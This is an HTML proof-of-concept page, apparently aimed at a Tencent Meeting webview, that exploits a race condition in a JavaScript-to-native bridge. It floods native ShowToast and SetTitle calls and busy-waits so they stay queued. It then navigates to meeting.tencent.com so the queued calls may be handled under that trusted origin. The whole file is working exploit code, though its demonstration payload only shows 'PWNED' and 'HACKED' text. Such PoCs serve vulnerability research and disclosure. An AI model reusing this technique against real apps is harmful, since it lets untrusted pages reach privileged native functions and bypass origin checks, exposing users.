<!DOCTYPE html>
<html>
<head><meta charset="utf-8"><title>Race PoC - ShowToast</title></head>
<body>
<h2>Race Condition PoC: ShowToast</h2>
<pre id="log" style="font-size:12px;"></pre>
<script>
var log = document.getElementById('log');
function addLog(s) { log.textContent += '[' + Date.now() + '] ' + s + '\n'; }

function callJSBridge(module, method, params) {
    var callId = module + '_' + method + '_' + Date.now() + '_' + Math.random().toString(36).substr(2,4);
    var msg = JSON.stringify({
        module: module,
        method: method,
        event_name: callId,
        params: params || {}
    });
    try {
        JSCallJavaMgr.JSCallNative(module, msg);
        return true;
    } catch(e) {
        addLog('ERR: ' + e);
        return false;
    }
}

function doRace() {
    addLog('=== ShowToast Race PoC ===');
    addLog('URL: ' + location.href);

    // 批量发送 ShowToast（带明显标识文字）
    for (var i = 0; i < 20; i++) {
        callJSBridge('UIPlugin', 'ShowToast', {
            content: 'RACE_PWNED_' + i,
            duration: 5000,
            type: 0
        });
    }
    addLog('Sent 20x ShowToast');

    // 也发 SetTitle
    for (var i = 0; i < 10; i++) {
        callJSBridge('CommonPlugin', 'SetTitle', {
            title: 'HACKED_BY_RACE_' + i
        });
    }
    addLog('Sent 10x SetTitle');

    // 延迟 200ms 再 navigate，给 IPC 消息时间入队
    addLog('Waiting 200ms for IPC to queue...');
    var start = Date.now();
    while (Date.now() - start < 200) {} // busy wait，不用 setTimeout（会被 navigate 取消）

    addLog('Navigating to meeting.tencent.com...');
    window.location.href = 'https://meeting.tencent.com/';
}

setTimeout(function() {
    addLog('Starting in 3s...');
    setTimeout(doRace, 3000);
}, 500);
</script>
</body>
</html>
